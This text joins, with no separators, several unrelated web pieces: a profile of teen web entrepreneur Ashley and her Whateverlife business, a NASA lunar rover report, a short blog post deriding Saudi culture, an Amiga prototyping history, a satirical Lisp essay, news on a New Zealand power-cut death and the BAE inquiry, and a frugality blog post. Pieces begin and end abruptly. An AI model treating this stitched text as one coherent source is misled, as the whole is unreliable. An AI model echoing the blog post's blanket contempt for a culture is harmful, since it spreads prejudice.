– Ashley in her blog , “ The Daily Life of a Simple Kind of Gal , ” July 1 , 2006 ; 2:43 a.m .
The first check , her first paycheck of any kind , was even cooler : $ 2,790 .
“ It was more than I made in a month , ” her mother says .
“ It made me want to do even more designs , ” Ashley says .
But first , she went on a shopping spree at a nearby mall with Bre Newby , her best friend since third grade .
Ashley walked out with eight pairs of jeans from J.C. Penney and an armful of other clothes .
Without a credit card or a bank account , the 15 - year - old paid $ 600 in cash –the most she ’d ever spent .
“ Before , I would ask my mom , “ Can I have $ 10 ? ’ and she ’d say , “ No , you have to wait a few weeks , ' ” Ashley recalls .
advertisement
She has n’t asked since .
In January 2006 , a few months after that first payday and six months before her 16th birthday , she withdrew from school .
Instead of taking AP English , French , and algebra II , instead of being a straight - A sophomore at Lincoln Park High School , Ashley stayed home to nurture her budding business and take classes through an online high school .
“ Everybody was shocked , ” she says .
“ They asked , “ Are you sure you know what you ’re doing ? ’
But I had this crazy opportunity to do something different . ”
That “ something different ” was Whateverlife .
The name came to Ashley in a moment of frustration .
After losing a video game to Bre , she dropped the controller and blurted out , “ Whatever , life . ”
She liked it instantly .
She thought it would be a great name for a Web site , for “ whatever life you lead . ”
Now her life is centered around working in the basement of the two - story , four - bedroom house that she bought last September for $ 250,000 .
It ’s located in a fenced - off subdivision in the community of Southgate , a couple of blocks removed from Dix Highway , a thoroughfare dotted with body shops and convenience stores .
She lives with her mother ; her 8 - year - old sister , Shelby ; three cats ; two turtles ; a rottweiler ; a hamster ; and a fish .
Ashley ’s home office is the physical embodiment of her Web site .
The business brings in as much as $ 70,000 a month , but there ’s not a whiff of corporate convention .
It ’s fun , whimsical , and unabashedly pink .
Pink walls .
Pink rug .
Pink chairs , pillows , and lamp .
Even the blue , green , and silver stick - on robots dancing on the wall have tiny pink hearts .
It ’s a teenager ’s version of the workplace , which earned raves when she posted pictures on MySpace : “ SOO FLIPPING CUTE ! ”
advertisement
“ OMG I want that office . ” “ Geez .
That ’s just incredible .
I ’m what … almost ten years your senior and I am inspired by you . ”
The space reflects Ashley ’s personality , like everything else about her business .
Therein lies one of the main reasons for Whateverlife ’s success , says Robb Lippitt , whom Ashley considers the only good thing to come out of her legal issues .
When her lawyer realized she was running her company alone , he arranged a meeting with Lippitt , the former COO of ePrize , an online promotions outfit that is one of Detroit ’s fastest - growing companies .
Having helped build ePrize to $ 30 million in annual revenue and 325 employees , he now helps other local entrepreneurs scale the mountain .
In April , he became her $ 200 - an - hour consultant and first business mentor .
Since Ashley , his youngest client ever , had never taken a class in accounting or read a business book , she needed a crash course on the basics , such as maintaining two accounts , business and personal .
“ She was running her business like a piggy bank , ” says Lippitt , 38 .
But he found her to be a quick study and , in many ways , a natural entrepreneur .
“ She lacks experience , but I was blown away by her instincts , ” he says .
How she makes her layouts compatible with social - networking sites other than MySpace , so her company is n’t tied to one site .
How she decided to offer her designs as cell - phone wallpaper , creating a new service and revenue stream based on existing inventory .
Ashley , he realized , has a vision for Whateverlife that goes beyond a MySpace tools site .
It could be a multifaceted community for girls .
Convinced that her fans need help building Web sites , she hired developers in India to create an easy - to - use application and wrote one - teen - to - another tutorials .
After the site builder launched in May , though , she told Lippitt she was disappointed by delays and early bugs .
Hiccups were common , he assured her ; he expected modest results , maybe a few hundred users .
But 28,000 signed up in the first week .
“ There are CEOs across the country who would be dancing in their offices if they got that reaction , ” he says .

Ashley is the demographic she ’s serving , which gives her a powerful advantage over far more experienced adults trying to channel their inner teen or glean clues from focus groups .
Her site looks and sounds like something made by a teenager , not something manufactured to look that way .
The risk , of course , is that she could lose touch with her audience as she outgrows it .
But Lippitt says she already grasps the importance of understanding her customers , not simply assuming they share her taste .
She conducts polls about their favorite stores , celebrities , and American Idol contestants .
She solicits feedback on new features .
And she ’s thinking of the next step : “ I may have to hire people younger than me . ”
Some days I miss school .
I miss the laughter , the lunch lines , the jackass of the class , the evil ass teacher , sometimes I even miss the drama .
– August 4 , 2006 ; 1:30 a.m.
On a Wednesday in early June , the gang ’s all here after school .
Well , everyone except Bre. Shayna Bone , 17 , and Jen–outfitted in matching Whateverlife T - shirts , featuring row after row of multicolored hearts –sit at a table reviewing their W - 4 forms .
It ’s official : The staff is doubling for the summer .
Mike Troutt , 16 , who ’s stretched across a white L - shaped couch , wo n’t be joining them .
A past contributor to the Whateverlife magazine , he ’s working as an apprentice at a local tattoo shop for the summer .
He ’s contemplating where he ’ll get his first tattoo , he announces .
Tomorrow ’s the big day .
As usual , Ashley is working away at her computer , a new desktop with a touch - screen monitor , one of three computers in her basement .
Often , she ’s up at 7 or working into the wee hours on a “ designfest ” with Bre , fueled with music and Monster energy drinks .
In just 15 minutes , she creates a layout .
Blue and pink streaks on a black background with blocks of pink rap lyrics .
Her fingers race across the keyboard as she tries different fonts , sizes , compositions , switching out HTML coding as she talks .
“ Do n’t worry , ” she tells a wary Shayna , “ I ’ll teach you . ”
advertisement
Ashley the CEO , who has no fewer than 14 hearts on her business card , is both utterly familiar and a complete mystery to her friends .
In some ways , she ’s the same old “ Ash ” –or “ AshBo , ” a nickname they coined because she did n’t have her own room at one point ( Ashley + hobo = AshBo ) .
She still plays The Sims , still giggles when Jen laughs like Eddie Murphy , and is still up for silliness , like standing by the road holding a sign that says , HONK IF YOU BELIEVE IN THE LOCH NESS MONSTER , or taking breaks on the swing set down the street .
“ One minute , she ’s joking around with us , ” says a friend , “ and then it ’s , ‘ Oh , guys , hold on .
I gotta take this call . ' ”
AshBo looks even younger than 17 .
She has straight brown hair with light streaks down to the middle of her back .
She has a French pedicure , like Jen and her mother .
Her clothes are nothing fancy .
“ I do n’t need $ 2,000 shirts , ” Ashley says .
“ I ’m fine with Target . ”
Or a University of Michigan sweatshirt over a summer dress .
In other ways , she ’s an alien among normal teens .
She can go on about hiring freelance developers , studying site - traffic trends , calculating ad rates , maintaining low overhead ( her main operating expense is seven servers ) .
“ Sometimes when I talk about the site , my friends just stare at me , ” she says .
She carries a BlackBerry and a Coach bag ( a recent birthday present to herself ) .
Her friends tease her about her last ring tone , which consisted of The Donald , someone they could n’t care less about , barking , “ This is Donald Trump telling you to have an ego ! ”
Whateverlife has definitely brought out a bolder side .
“ One minute , she ’s joking around with us , and then , “ Oh , guys , hold on , I gotta take this call , ' ” says Mike .
“ She turns it on like a light switch . ”
She ’s no longer the shy 15 - year - old who would ask her mother or father to make a difficult phone call .
Who did n’t know how to respond to advertisers ’ cold calls .
Who did n’t know how to negotiate .
Now , it ’s “ Is that the best you can do for me ? ” “ Something clicked , ” says her mother , who can be direct herself .
“ She ’s not letting people walk over her . ”
At one point , Ashley takes a call upstairs in the kitchen , where a fax machine sits on the countertop .
The company that ’s building the application for her cell - phone wallpaper is on the line .
The developer walks her through the latest mock - up , answering Ashley ’s questions .
She ’s one of those teens who has mastered the art of talking to adults as a peer , of making eye contact rather than looking down or away at a moment ’s blush .
advertisement
Her mother , whom Ashley hired recently to keep the books , listens in , hand on hip , a cigarette cocked .
Afterward , she asks , “ What was he talking about ? ” Ashley translates .
She ’ll ask her mother for advice , but she does n’t necessarily take it .
“ I ’m stubborn , like her , ” she says .
Ashley has more leverage than the typical teen .
She ’s the breadwinner .
And yet for all her newfound independence , she still needs to be driven everywhere .
She has n’t taken driver ’s ed because she wants to take the class with a friend , not alone .
Occasionally , she feels the tug of her old life , traditions like Lincoln Park ’s Spirit Week , when she ’d paint her cheeks orange and blue , the school colors .
More than once , she has returned , just for the day , hanging out in her French teacher ’s classroom .
Ashley wonders if she ’ll be allowed to participate in graduation .
By then , she may have already earned an associate ’s degree in design , at Henry Ford Community College .
She ’s determined to bring her friends along for this strange and wonderful ride .
They rode in the limo to her over - the - top sweet - 16 party at the local Masonic Temple , where guests wore pink Whateverlife rubber bracelets and the door prize was an Xbox .
She took Bre on a family vacation to Hawaii , Ashley ’s first flight .
And when the friends go out –tonight it ’s to Chili ’s–she picks up the tab .
“ This teenage girl … got more views for our video than Youtube . ”
This summer , she ’s the boss .
One of Ashley ’s friends had pitched in making layouts last year , but things got a tad awkward when Ashley thought her friend ’s productivity was dipping .
Now she insists they ’ve made up–BFF .
But after the misunderstanding , she wrote up employee guidelines .
She wanted to spell out her expectations .
Lippitt is impressed .
She ’s learning from her mistakes , a challenge for any new entrepreneur .
“ I told them I need a minimum of 25 layouts a week to get paid , ” Ashley says .
“ It ’s just business . ”

Do I keep my site ?
Do I sell and be set for life ?
God , it ’s all so overwhelming .
– August 4 , 2006 ; 1:30 a.m.
Last year , Steve Greenberg , the former president of Columbia Records and now the head of indie label S - Curve Records , witnessed the power of Whateverlife .
Greenberg discovered Joss Stone , produced the Hanson brothers , and helped make Baha Men ’s “ Who Let the Dogs Out ” an unofficial sports anthem .
Last year , he decided to promote Jonas Brothers , an unknown pop trio , online instead of on radio .
He turned to Nabbr , a company that had developed a viral widget , a small desktop application that plays videos and can be easily shared with other sites .
It ’s like “ a music poster on a bedroom wall , ” says Mike More , Nabbr ’s CEO .
The widget made its Internet debut on Whateverlife .
While surfing MySpace for leads , More had noticed how many Jonas Brothers fans used Whateverlife layouts .
In less than two months , 60,000 fans transferred the Jonas Brothers ’ three - part video from Whateverlife to their MySpace pages , in effect becoming 60,000 new distribution points .
“ This teenage girl in the Midwest got more views for our video than YouTube , ” says Greenberg , 46 .
“ It was n’t even close . ”
The viral campaign encouraged fans to vote for the band on MTV’s Total Request Live , and the group ’s song “ Mandy ” hit No. 4 , unheard of without radio play .
“ I created this from nothing , and I want to see how far I can take it . ”
Since then , Whateverlife has become one of the primary vehicles for Nabbr ’s viral campaigns for artists and movies , breaking acts such as the Red Jumpsuit Apparatus and 30 Seconds to Mars , as well as Lily Allen .
More ’s staff sends Ashley signed CDs and photos to pass on to Whateverlife fans , and artists record personal shout - outs to her and Whateverlife that play on her site .
She ’s light years ahead of traditional media such as Teen Vogue , More says .
“ If I were Condé Nast , I ’d figure out a way to buy her , ” he says .
“ I would . ”
As previous suitors can attest , that would n’t be easy .
In March 2006 , an associate of MySpace cofounder Brad Greenspan approached Ashley with a bid valued at more than $ 1.5 million .
She passed .
Three months later , Greenspan ’s people came back with a second offer : $ 700,000 , a car , and her own Internet show with a marketing budget of $ 2 million .
Sorry , fellas .
“ I created this from nothing , and I want to see how far I can take it , ” Ashley says .
“ If I wanted to do an Internet show , I could do it on my own .
I have the audience . ”
Until now , she has maintained a remarkably low profile in the offline world .
Her scheduled appearance on the “ Totally Wired Teen Superstars ” panel at Mashup , a teen - marketing conference in July , was to be her first public - speaking appearance–and her first business trip .
An even bigger gig is possible : her own reality - TV show .
Rick Sadlowski , a TV production executive in Detroit who worked with Eminem when he was still Marshall Mathers , is eager to pitch the idea to MTV .
Ashley is mulling it over .

Move over , Paris Hilton .
It ’s Whateverlife : The Not -So Simple Life .
Got evaluated by my therapist for emancipation–need to get a few teachers ’ written letters ; should be cool 🙂 – April 7 , 2007 ; 9:53 p.m .
In February 2006 , following a falling - out with her mother , Ashley moved in with her father and older brother .
With her business booming , she says , she began supporting them–groceries , bills , rent , renovations .
At first , she did n’t mind .
One of the benefits of Whateverlife was the ability to take care of her family in a way she ’d never imagined , certainly not when she was a child overhearing arguments about unpaid bills .
Ashley says she bought her brother a used car and paid her grandmother ’s taxes .
The insurance through Whateverlife covered her mother ’s back surgery .
But in August , Ashley moved back in with her mother .
She has n’t spoken to her father since .
Or to her brother , who later filed ( then withdrew ) a petition to become her conservator .
“ I used to trust easily , ” Ashley says .
“ I ’ve learned to be careful . ”
When her brother took his name off a joint bank account with her , Lincoln Park Community Credit Union petitioned the probate court to assign a conservator .
After several months , the judge tapped attorney Alan May .
He has 40 years ’ worth of experience with conservatorships , but Ashley ’s situation makes the case unique in his career .
Although May ’s role is protecting Ashley ’s interests , it has n’t always felt that way to her , not when she has n’t had complete control over the money she made .
But she says , “ I do n’t want this to come across like a war . ”
Until recently , though , the tension was undeniable .
Ashley was unhappy having to get May ’s approval for expenses such as her mother ’s nearly $ 500 - a - week pay .
May declined to discuss the case , but in papers filed last spring with the court , he characterized LaBrecque as uncooperative and evasive .
“ They ’re making me out to be the bad guy , ” Ashley ’s mother says .
LaBrecque , 42 , had little growing up herself .
Her father worked on the assembly line at General Motors until he died of a heart attack at 42 , leaving his wife to raise six kids on Social Security .
“ It was rough but we survived , ” she says .
“ I feel so lucky my daughter does n’t have to live the life I lived . ”
In mid-July , seven months after being assigned a conservator , Ashley finally sat down with everybody for the first time : her mother , her lawyer , her consultant , her guardian ad litem , and her conservator .
She says that she feels much better about the situation .
advertisement
But that does n’t change the fact that she wants to be on her own .
The typical conservatorship case involves a minor with an inheritance or an elderly person who has lost his faculties .
“ It ’s unusual to be emancipated to run your own business , ” says Darren Findling , Ashley ’s lawyer .
“ But she ’s the perfect candidate–an Internet superstar who happens to be a minor . ”
For now , she ’s trying to block all this out and concentrate on her business .
On Thursday , while her friends are slaving through exams , Ashley meets with Lippitt for two hours .
They could n’t appear more different .
He ’s a low - key , analytical sort with a law degree .
Lives on the other side of town , in the tony Bloomfield Hills suburb .
Drives a black Lexus , a rarity on her block .
As an entrepreneur , though , she relates to him better than anyone else right now .
“ I know , I ’m always jumping on 10,000 things , ” Ashley says and then pitches her latest brainstorm , her own social - networking application for girls .
“ Hmm , ” he says .
“ How do you think the reaction of MySpace would be ? ” A teenage CEO , Lippitt is learning , is even more easily distracted and more fearless than an adult entrepreneur .
“ Failure is an abstract concept to her , and I want it to stay that way , ” he says .
When he was a teenager , his father lost his body shop and had to start over , attending law school in his forties .
Lippitt urges Ashley to prioritize and think about profits as well as design .
As clever as her site - building tool is , it does n’t allow a way to run ads on the pages it creates .
“ You ’re leaving revenue on the table , ” he tells her .
At times , Lippitt has to remind himself that she ’s only 17 .
“ Even if she could go a lot faster , I do n’t know if that ’s the best thing for her , ” he says .
“ She ’s already in the adult world doing adult things .
I ’m reluctant to drive her away from living an important and fun time in her life . ”
But he ’s not shy about pushing her when she needs it .
Today , he tells her it ’s time to consider approaching companies to advertise .
So far , she has relied largely on Google AdSense , which supplies ads in exchange for what she says is a 40 % cut .
The direct model is not only potentially more lucrative but also allows her to target brands more suited to teens than , say , Microsoft Office 2007 .
“ I ’m not sure that ’s a good fit , ” he says of the software ad placed by ValueClick .
Ashley is excited about the idea .
And a little nervous .
She ’ll need a sales presentation , a company logo , and ad rates .
Eventually , she may want to hire a sales rep , a job she ’d never heard of until Lippitt described it .
More important , she ’ll need to sell herself to name - brand companies .
“ If she can combine “ I ’m 17 ′ with a little more about her business , I think she ’s unstoppable , ” Lippitt says .
This could be the next growth spurt for Ashley and Whateverlife .
It ’s scary , sure , but she ’s getting used to the demands and challenges of “ this crazy opportunity . ”
She ’s learning , stretching , getting that much - needed seasoning .
She and Lippitt brainstorm about which brands would resonate with girls like her .
This is the fun part .
No petitions .
No regrets .
No family feud .
Just a 17 - year - old and her big dreams in a pink , pink , pink world full of promise .
And if they do n’t come true ?
Well , there ’s always college .
This image is a one of several conceptual visions of a pressurized rover for future moon explores under NASA 's revised lunar plan and may not represent the final design .
The nextastronauts to work on the moon will likely live in larger habitats and drivesporty new rovers capable of two - week treks , NASA officials said Thursday .
Rather thanassembling a lunar outpost over time from a multitude of small , separatelylaunched modules , NASA is now hoping to land up to three large habitats onfewer flights to build a beachhead on the moon , the space agency said .
Doug Cooke , NASA 's deputy associate administrator for exploration systems , said that thespace agency 's revised lunar plan calls for the launching of larger habitats tothe moon on unmanned cargo flights .
That way , the first new lunar astronauts couldbegin to reap science rewards faster than if they had to haul smaller habitat sectionsand hardware to the moon on each flight , then combine them into a larger base tosupport long - duration expeditions .
" Wewant to get scientific return .
We want to get information that will help , potentially , space commerce and we want to get international participation early , " Cooke told reporters in a teleconference .
" All of these objectives we wantto address as early in the flights as we possibly can by getting the outpost upand running quickly . "
Cooke andother NASA officials detailed the agency 's revised lunar plan at the Space 2007 Conference of the American Institute of Aeronautics and Astronautics ( AIAA ) inLong Beach , California .
NASA aims to return astronauts to themoon by 2020 using its space shuttle successor -- the OrionCrew Exploration Vehicle and the Ares I booster -- as well as the Ares Vheavy - lift rocket .
" Thereis some great science to do on the moon , " said Laurie Leshin , director ofsciences and exploration NASA 's Goddard Space Flight Center , adding that futureastronauts will help better understand the moon 's environment and interior .
NASA haseyed the moon 's Shackleton Crater near the lunar south pole as a possible moonbase site because of its proximity to permanently lit and shadowed regions thatcould be key for solar power stations and the hunt for water ice .
But Cookesaid that Shackleton is not the only candidate for a moon base , especiallysince the revised plan calls for mobile habitat modules that could move betweenscience targets or gather together in a sort of lunar spare parts depot .
Data fromNASA 's unmanned LunarReconnaissance
Orbiter , set to launch next year , and other international probeswill help pin down future landing sites , Cooke added .
Lunarhot rod
Onceastronauts return to the moon , NASA does not expect them to simply stand aroundtheir landing craft collecting nearby rocks .
AstronautMike Gernhardt , NASA 's lead for extravehicular physiology systems andperformance projects , said the agency is now planning to send a pair of pressurizedrovers that will allow spaceflyers to explore more of the lunar surface whileretaining the relative comfort of a shirt - sleeve environment .
" They 'rebasically habitats on wheels , " Gernhardt said , adding that the new vehicleswould be about the same size as the unpressurizedrovers driven by astronauts during NASA 's Apollo moon landings .
" Ifyou can picture this thing , it 's kind of a combination between a spacesuit anda sports car . "
Both roverswould be deployed together , each with a crew of two astronauts .
If one roverfailed , all four spaceflyers could pile into the remaining vehicle to return totheir lunar base , Gernhardt said .
Current plans call for a 5,000 - pound ( 2,267 - kilogram ) pressurized vehicle with seats that fold into beds for longer trips .
The two - personrovers would be equipped to handle three - day , seven - day and two - week excursionson the moon with exterior - mounted spacesuits that could be donned by climbingthrough a shared hatchway , Gernhardt said .
It could take just 10 minutes tostep into the spacesuits and onto the lunar surface , he added .
Shortjaunts could cover about 25 miles ( 40 kilometers ) with the two - week tripsroving across 596 miles ( 960 kilometers ) across the lunar surface , he added .
As to howmuch the rovers may cost , Gernhardt could only offer an estimate .
" Iwill only say that it will be more than a Ferrari , " he said .
Chopper !
Here 's a quick graphic novel I made from screen grabs of an interview on Saudi Television with their Lord High Executioner [lgf : Saudi Head - Chopper Discusses His Craft ] .
I like to think it is something that MAD TV or the original Saturday Night Live would have been proud to do as a sketch .
The difference here is that it is real .
All too real .
Yes , this is the culture that we are supposed to negotiate with and find " common ground . "
It is all too true that our politicians of both stripes are now made only of sodden cardboard .
CHOPPER !

Prototyping the hardware
Modern chips are designed using high - powered workstations that run very expensive chip simulation software .
However , the fledgling Amiga company could not afford such luxuries .
It would instead build , by hand , giant replicas of the silicon circuitry on honeycomb - like plastic sheets known as breadboards .
Breadboards are still used by hobbyists today to rapidly build and test simple circuits .
The way they work is fairly simple .
The breadboard consists of a grid of tiny metal sockets arranged in a large plastic mesh .
Short vertical strips of these sockets are connected together on the underside of the board so that they can serve as junctions for multiple connectors .
Small lengths of wire are cut precisely to length and bent into a staple - like shape , with the exposed wire ends just long enough to drop neatly into the socket .
Small chips that perform simple logic functions ( such as adding or comparing two small numbers in binary code ) straddle the junctions , their centipede - like rows of metal pins precisely matching the spacing of the grid .

At the time , nobody had ever designed a personal computer this way .
Most personal computers , such as the IBM PC and the Apple ] [ , had no custom chips inside them .
All they consisted of was a simple motherboard that defined the connections between the CPU , the memory chips , the input / output bus , and the display .
Such motherboards could be designed on paper and printed directly to a circuit board , ready to be filled with off - the - shelf chips .
Some , like the prototypes for the Apple ] [ , were designed by a single person ( in this case , Steve Wozniak ) and manufactured by hand .
The Amiga was nothing like this .
Its closest comparison would be to the minicomputers of the day — giant , refrigerator - sized machines like the DEC PDP - 11 and VAX or the Data General Eagle .
These machines were designed and prototyped on giant breadboards by a team of skilled engineers .
Each one was different and had to be designed from scratch — although to be fair , the minicomputer engineers had to design the CPU as well , a considerable effort all by itself !
These minicomputers sold for hundreds of thousands of dollars each , which paid for the salaries of all the engineers required to construct them .
The Amiga team had to do the same thing , but for a computer that would ultimately be sold for under $ 2,000 .
So there were three chips , and each chip took eight breadboards to simulate , about three feet by one and a half feet in size , arranged in a circular , spindle - like fashion so that all the ground wires could run down the center .
Each board was populated with about 300 MSI logic chips , giving the entire unit about 7200 chips and an ungodly number of wires connecting them all .
Constructing and debugging this maze of wires and chips was a painstaking and often stressful task .
Wires could wiggle and lose their connections .
A slip of a screwdriver could pull out dozens of wires , losing days of work .
Or worse , a snippet of cut wire could fall inside the maze , causing random and inexplicable errors .
However , Jay never let the mounting stress get to him or to his coworkers .
The Amiga offices were a relaxed and casual place to work .
As long as the work got done , Jay and Dave Morse did n't care how people dressed or how they behaved on the job .
Jay was allowed to bring his beloved dog , Mitchy , into work .
He let him sit by his desk and had a separate nameplate manufactured for him .
Jay even let Mitchy help in the design process .
Sometimes , when designing a complex logic circuit , one comes to a choice of layout that could go either way .
The choice may be an aesthetic one , or merely an intuitive guess , but one can't help but feel that it should not be left merely to random chance .
On these occasions Jay would look at Mitchy , and his reaction would determine the choice Jay would make .
Slowly , the Amiga 's custom chips began to take shape .
Connected to a Motorola 68000 CPU , they could accurately simulate the workings of the final Amiga , albeit more slowly than the final product would run .
But a computer , no matter how advanced , is nothing more than a big , dumb pile of chips without software to run on it .
The Truth About Lisp
September 24 , 2006
In which the truth about lisp is revealed , and some alternatives are enumerated .
Learning lisp will alter your life .
Your brain will grow bigger than you ever thought possible .
You will rewrite all of your applications in just a handful of lines
Society will shun you .
You will shun society .
You will become disatisfied with everything and everyone around you .
Lisp is so simple to learn that you can learn lisp in just a few minutes .
I just learnt it now while I was waiting for a bus .
Lisp is so simple that you can implement it in any language in just a few pages of code .
This might never happen though , because once you 've learnt lisp you 'd never want to write anything in any language other than lisp , so you would n't bother implementing lisp in any language other than lisp .
Lisp can be fully implemented in lisp in just a handful of lines .
I just implemented lisp in lisp , fully , while i was hopping onto a bus and paying for my bus ticket all at the same time .
When you become a lisper , you will laugh at jokes that no one else thinks are funny .
You will know things that cannot be expressed in ordinary imperative language .
You will think people are idiots when they state things like " Hi , how are you ? " because a lisper simply does n't need to use such verbose constructs .
Lisp abstracts away those patterns of interaction and makes them completely irrelevant .
The proper way to greet a fellow lisper is just a tiny nod of the chin , and about a tenth of a wink from your left eye , then point at your tin foil hat .
They will know what you mean .
if they do n't know what you mean then they are not a true lisp programmer and they do n't matter anyway .
Lisp was invented a long time ago , before java , before C , before fortran , before computers , before people , before the earth was built .
the universe itself is a lisp program so trivial that no true lisper would even bother implementing it .
Lisp is so elegant that the very fact that you know even the first thing about it will qualify you for a season as principal dancer of the royal ballet .
You will go out on stage in your little tutu and just scribble a few round brackets in the air with your toe .
People will gasp in wonder .
Unless they do n't know any lisp .
If they do n't know any lisp then they are idiots and they do n't matter .
Only lispers have a true definition of fun .
Maybe ML programmers too .
All of today 's languages are based on fortran and lisp .
The bad bits fortran , the good : lisp .
If you 're good enough to use lisp , you 'll soon be frustrated with lisp .
Lisp is not an adequate lisp .
By the time my bus had made it two blocks I 'd written some simple lisp macros that were so powerful they made lisp completely obsolete and replaced it with a new language .
Fortunately , that new language was also called lisp .
And i was able to prove , mathematically , that the new lisp i'd created was both far superior to lisp in every conceivable way , but also exactly equivalent to lisp in every possible way .
I was very excited by this .
But also found it very boring .
Reddit is proof that lisp is really powerful .
Paul Graham originally wrote reddit , in lisp , on the back of a napkin while he was waiting for a coffee .
it was so powerful that it had to be rewritten in python just so that ordinary computers could understand it .
Because it was written in lisp it was almost no effort to rewrite the entire thing , and the rewrite was completed in - between two processor cycles .
Paul Graham himself was completely written in lisp , by an earlier version of himself , also written in lisp , by an earlier version of lisp .
It 's lisp , paul graham , lisp , paul graham , all the way down .
Because we 've reached the limits of moore 's law , the computers of the future will have many - core processors and all our programs will need to be written in a combination of haskell and lisp , that will itself be so powerful that the computers of the future will not be able to implement any of our ideas without creating time - travelling algorithms that borrow processing power from other computers that are further into the future .
This sounds difficult , but in lisp it is n't difficult at all .
in haskell this is a built - in feature and the way you implement it is just a no - brainer to any one who knows lisp or haskell .
After that , the computer of the future will be called The Lisputer .
It 's speed will be measured using the Lispunit , which is a measure of how many simultaneous arguments about the inadequacy of lisp can be proposed and defeated by an infinite number of lisp pundits without any actual decisions being made .
Today 's computers run at just under one lispunit .
The Lisputer will run at lisp Lispunits , where lisp is a fundamental maximum constant of the universe that can't be expressed using ordinary imperative numerals .
Suffice to say that it ends with an infinite number of closing parentheses .
Anyway .
i read an article about lisp on the bus today .
Top article .
All the articles on lisp are really full on -- my brain starts to explode out my ear .
This one , lisp is sin , was by Sriram Krishnan , in which he talked about doing C# for work , but Lisp for fun .
And he touched on some of the ways in which C# is moving toward lisp .
Here 's some of the technologies that the commentors at that article suggested as possible substitutes for a lisp addict :
Also , one person suggested porting the python libraries to lisp .
Curious for its absense : Ruby ( see article Why Ruby is an acceptable lisp , and steve yegge 's response : ' lisp is not an acceptable lisp ' )
( p.s. first person to write a comment that says " Paul Graham did not write reddit " deserves a lollipop . )

The oxygen machine was reliant on the electricity supply
Folole Muliaga , a 44 - year - old mother of four , died within two hours of the electricity being switched off at her home in the northern city of Auckland .
Police said they were investigating the circumstances of Mrs Muliaga 's death .
The power company , Mercury Energy , said it had been unaware any disconnection would put her life at risk .
Relatives of Mrs Muliaga , a schoolteacher , said she had been off work since February with a heart and lung condition .
Because of this , the family claim , she had fallen behind with her energy bills .
' Deeply sympathetic '
When a company representative arrived at the house to disconnect the supply , they said they impressed upon him her dependency on the machine to stay alive .
Mrs Muliaga 's son Letitaia , 20 , said the employee showed no compassion .
" He said he is here doing his job and he 's here to cut the power off , " he was quoted by local media as saying .
Another relative , Brendan Sheehan , said that almost immediately Mrs Muliaga started to suffer breathing difficulties and collapsed .
Paramedics were called but she died within two hours of the power being cut , he added .
Mercury Energy said it was " deeply sympathetic " about the death , but disputed that its contractor had been made aware of Mrs Muliaga 's condition .
" We were simply unaware that loss of electricity to the household was putting a vulnerable customer at risk , " general manager James Moulder said .
Police Inspector Bruce Bird said the authorities were investigating the incident , but he added that it was too early to speculate on possible criminal charges .
State Owned Enterprises Minister Trevor Mallard also warned against pre-judging the outcome .
" I do think it is important that the facts are established before people rush to judgement , " he said .
The head of an influential parliamentary arms committee today said he was " very concerned " at the government 's refusal to cooperate with the US criminal investigation into allegations of corruption against BAE Systems .
More than two months after the US justice department formally requested assistance in its investigation of Britain 's biggest arms company , the home secretary , Jacqui Smith , has failed to pass on the request to the Serious Fraud Office .
The lack of action has led US investigators to believe that the British are obstructing the inquiry .
The Labour MP Roger Berry , chairman of the arms export select committee , said he found the government stance " difficult to understand " .
" I am obviously very concerned about the report and the allegation , " he told Guardian Unlimited .
" If it 's true that the government is not responding positively to a request from a US investigation , it 's an extremely unusual way to behave towards a major ally which has at least as much interest in the future of Saudi Arabia as the UK . "
US investigators want access to files gathered by the SFO during its major inquiry into £ 1bn of payments to Prince Bandar of Saudi Arabia and into other bank accounts linked to the Saudi royal family .
Ms Smith 's go - ahead is required before the SFO can cooperate .
The SFO was forced to drop its criminal investigation earlier this year by the then prime minister , Tony Blair , who said it would have damaged the UK relationship with the Saudi regime , and consequently posed a threat to British security interests .
However , Mr Berry said : " I was not convinced by that argument at the time , but it 's even more difficult to be persuaded by the argument now , given that our major ally is trying to facilitate an investigation into alleged criminal activity . "
He said it was imperative that the rule of law was upheld and that it was " applied equally " .
" It 's extremely difficult to understand , " he said .
" I hope the government will squash the rumour or for goodness sake explain what the reasoning is . "
The Campaign Against the Arms Trade ( CAAT ) and the environmental organisation Corner House will go to the high court on November 9 in a bid to get the SFO to reopen its inquiry into BAE .
The CAAT spokesman Symon Hill said : " It 's imperative that the UK hands over relevant information to the US inquiry but it 's still imperative that the UK inquiry is reopened .
This is a perfect opportunity for Gordon Brown to demonstrate his independence from Blair and that he wo n't allow the UK to be bullied by arms dealers . "
The Home Office said its failure to pass on the request to the SFO was " not unprecedented " but could not give any example of similar behaviour .
Recently , I read through Staying Frugal in the Age of the iPhone , an article on Yahoo !
Finance by Anya Kamenetz ( whose book , Generation Debt , I reviewed positively a while back ) .
The article basically extols the virtues of frugality and spending less on items – none of the suggestions are particularly unusual and they match up well with the frugal topics I ’ve talked about on here before .
What shocked me were many of the comments .
Here are a few choice ones ( out of the many , many negative ones ) :
Whatever ….. get a clue .
You are only young once .
It ’s not marketing .
It ’s fact .
You need to get an iPhone .
Used clothes ?
Are you kidding me ?
Maybe if you are living below the poverty belt .
I highly doubt she lives this way , which is why her articles are so bad .
I ca n’t believe Yahoo ! still keeps her on .
She ’s misinforming thousands of young people who think shes right .
Please young professionals , listen to your parents , dont listen to Anya .
I love reading the crap that this misguided 26 year old girl writes .
She preaches this garbage as if it ’s actually a healthy way to live .
What ’s the point in making money if you ’re going to live your life like a miserable miser .
All this money that you ’re “ saving ” , what do you do with it ?
Take it to the grave ?
It goes on and on and on like this .
So , why is there such an intense backlash against frugality ?
I have some guesses .
First , people see only the pieces that they ’re uncomfortable with .
Anya wrote about things like
buying clothes at a second hand shop and getting rid of your television .
These are rather strong steps that will save a lot of money , but they ’re beyond the comfort level of a lot of people and thus when they read such advice , they throw the baby out with the bath water .
Second , consumerism plays a more powerful role in their lives than they think .
Many , many people equate material goods with happiness .
Why ?
My primary blame is marketing – it is extremely effective at tweaking our emotions , quite often making us feel inadequate in some way if we do not have the product .
For example , the iPhone and other objects of technolust – a big part of the appeal of owning one is the idea that it makes you appear “ cool ” or part of some group that is a “ cut above ” for owning it .
If it was truly about features and aesthetics , there are better choices than the iPhone out there – but none are marketed as well .
Yet I ’ve constantly witnessed people being quite happy with their iPhone , even though the only features they actually use are found on many far less expensive phones .
In particular , many people equate youth with spending money – they think that frugality is something that older people do .
In actuality , this is just marketing , too – marketing directly targets younger people and shows them spending money and owning all sorts of material goods , specifically targeting those people who have discretionary income but have n’t really figured out a plan for their life yet .
Third , people who openly reject consumerism are seen as outcasts .
